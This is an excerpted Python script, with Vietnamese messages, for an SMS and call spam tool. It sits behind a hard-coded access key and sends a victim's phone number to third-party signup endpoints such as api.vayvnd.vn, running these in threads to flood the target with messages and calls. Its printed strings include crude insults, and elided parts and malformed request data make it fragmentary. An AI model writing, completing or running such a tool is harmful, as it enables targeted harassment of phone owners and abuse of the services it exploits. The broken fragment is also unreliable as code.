...
amount = 5000
key = "spamking"
ma = input("nhập key đi cu : ")
if ma == key :
 print (" úi thượng đế đợi em tý ")
 os.system("clear")
else :
 print("WOW SÚC VẬT CHỘM KEY TAO À")
 exit()
...
def vayvnd(sdt):
  data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite"}'.replace("sdt",sdt)
  head = {
    "Host":"api.vayvnd.vn",
...
def run(sdt,i):                  
  ...
  threading.submit(KILO,sdt)
  threading.submit(GAPO,sdt) 
  print("[ SUCVAT TOOL] Spam SMS - Call | Delay : 5 | Trạng Thái : Thành Công ",)  
  for j in range(0, 5):
    # code trong vòng lặp
    print(f"[ SMS TOOL] | LOADING \r",end="")
    # code by AwmxBaby
